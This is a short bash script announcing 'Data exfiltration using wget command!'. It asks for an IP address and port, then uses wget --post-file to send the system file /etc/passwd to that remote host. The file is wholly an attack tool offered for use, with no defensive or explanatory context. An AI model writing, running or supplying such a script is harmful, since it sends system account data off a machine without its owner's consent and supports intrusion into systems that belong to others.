#!/bin/bash

echo -e "\e[92mData exfiltration using wget command!"

printf "Enter the IP Addres: "
read IP
printf "Enter the Port: "
read PORT

echo -e "\e[92mSending data to the remote server..."
wget --post-file=/etc/passwd $IP:$PORT

